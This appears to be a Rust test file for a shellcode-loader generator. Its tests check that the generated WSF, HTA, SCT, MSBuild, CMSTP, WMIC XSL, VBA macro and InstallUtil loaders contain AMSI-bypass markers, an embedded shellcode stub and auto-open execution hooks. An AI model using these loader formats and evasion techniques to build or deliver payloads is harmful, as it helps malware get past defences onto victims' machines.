use template_engine::*;

fn base_config(t: LoaderType) -> LoaderConfig {
    LoaderConfig {
        loader_type: t,
        features: vec![],
        encryption: Encryption::Aes256,
        shellcode_hex: "fc4883e4f0".into(),
        key_hex: "deadbeef".into(),
        iv_hex: "0011223344556677".into(),
        pe_config: None,
        appdomain_config: None,
    }
}

#[test]
fn wsf_renders_with_amsi_bypass() {
    let src = generate_script_source(&base_config(LoaderType::Wsf)).unwrap();
    assert!(src.contains("AmsiUtils") || src.contains("amsiInitFailed"));
    assert!(src.contains("fc4883e4f0")); // shellcode embedded
}

#[test]
fn hta_renders() {
    let src = generate_script_source(&base_config(LoaderType::Hta)).unwrap();
    assert!(src.contains("HTA:APPLICATION"));
}

#[test]
fn sct_renders() {
    let src = generate_script_source(&base_config(LoaderType::Regsvr32Sct)).unwrap();
    assert!(src.contains("<scriptlet>"));
    assert!(src.contains("progid="));
}

#[test]
fn msbuild_renders() {
    let src = generate_script_source(&base_config(LoaderType::MsBuild)).unwrap();
    assert!(src.contains("UsingTask"));
    assert!(src.contains("CodeTaskFactory"));
}

#[test]
fn cmstp_renders() {
    let src = generate_script_source(&base_config(LoaderType::Cmstp)).unwrap();
    assert!(src.contains("UnRegisterOCXSection"));
}

#[test]
fn wmic_xsl_renders() {
    let src = generate_script_source(&base_config(LoaderType::WmicXsl)).unwrap();
    assert!(src.contains("ms:script"));
}

#[test]
fn vba_word_renders() {
    let src = generate_vba_source(&base_config(LoaderType::DocxMacro)).unwrap();
    assert!(src.contains("Document_Open"));
    assert!(src.contains("AmsiScanBuffer") || src.contains("CallWindowProc"));
}

#[test]
fn vba_excel_renders() {
    let src = generate_vba_source(&base_config(LoaderType::XlsxMacro)).unwrap();
    assert!(src.contains("Workbook_Open"));
}

#[test]
fn csharp_installutil_renders() {
    let src = generate_csharp_source(&base_config(LoaderType::InstallUtil)).unwrap();
    assert!(src.contains("RunInstaller"));
    assert!(src.contains("Uninstall"));
}
